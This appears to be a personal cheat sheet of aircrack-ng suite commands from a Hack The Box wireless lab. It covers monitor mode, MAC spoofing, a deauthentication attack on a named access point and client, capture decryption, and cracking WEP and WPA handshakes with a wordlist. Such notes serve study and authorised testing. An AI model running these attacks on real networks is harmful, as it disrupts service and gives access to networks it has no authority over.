
# airmon-ng
```bash
sudo airmon-ng

# kill blockers app
sudo airmon-ng check kill

# enable monitor mode
sudo airmon-ng start wlp61s0
# on 11 channel
sudo airmon-ng start wlp61s0 11

sudo airmon-ng stop wlp61s0mon
```
# change mac
```bash
sudo macchanger wlan0 -m 3E:48:72:B7:62:2A
```
# aireplay-ng
### Test if injection is possible
```bash
sudo iw dev wlp61s0mon set channel 1
sudo aireplay-ng --test wlp61s0mon
```
### Deauthentication attack
Run `airodump-ng`, write out AP and client IDs, then run:
```bash
# 5 - number of deauths to send
sudo aireplay-ng -0 5 -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlp61s0mon
```
Check `airodump-ng` output to see the evidenced by the increase in `Lost` packets and `Frames` count.

# airodump-ng
```bash
sudo airodump-ng wlp61s0mon  

mkdir wifi-dump && cd wifi-dump
# saves dumps to files with prefix HTB
sudo airodump-ng wlan0mon -w HTB
```

### Bands
* a uses 5 GHz
* b uses 2.4 GHz
* g uses 2.4 GHz
```bash
sudo airodump-ng wlan0mon --band a
```

# airgraph-ng
Use files created by airodump-ng:
```bash
# Clients to AP Relationship Graph
sudo airgraph-ng -i HTB-01.csv -g CAPR -o HTB_CAPR.png

# Common Probe Graph
sudo airgraph-ng -i HTB-01.csv -g CPG -o HTB_CPG.png


```
# airdecap-ng
* Removing wireless headers from an open network capture (Unencrypted capture).
* Decrypting a WEP-encrypted capture file using a hexadecimal WEP key.
* Decrypting a WPA/WPA2-encrypted capture file using the passphrase.
### Removing Wireless Headers from Unencrypted Capture file
```bash
sudo airdecap-ng -b 00:14:6C:7A:41:81 opencapture.cap
```
### Decrypting WEP-encrypted captures
```bash
sudo airdecap-ng -w 1234567890ABCDEF HTB-01.cap
```
### Decrypting WPA-encrypted captures
```bash
# -p is password
sudo airdecap-ng -p 'abdefg' HTB-01.cap -e "Wireless Lab"
```

# aircrack-ng
### benchmark
```bash
aircrack-ng -S
```

### Cracking WEP
Collect Initialization Vectors:
```bash
sudo airodump-ng --ivs --write WEP

aircrack-ng -K WEP.ivs
```

### Cracking WPA
 "four-way handshake" serves as the required input. 
Aircrack-ng can effectively operate with just two packets. Specifically, EAPOL packets 2 and 3, or packets 3 and 4, are considered a full handshake.
```bash
aircrack-ng HTB.pcap -w /opt/wordlist.txt
```

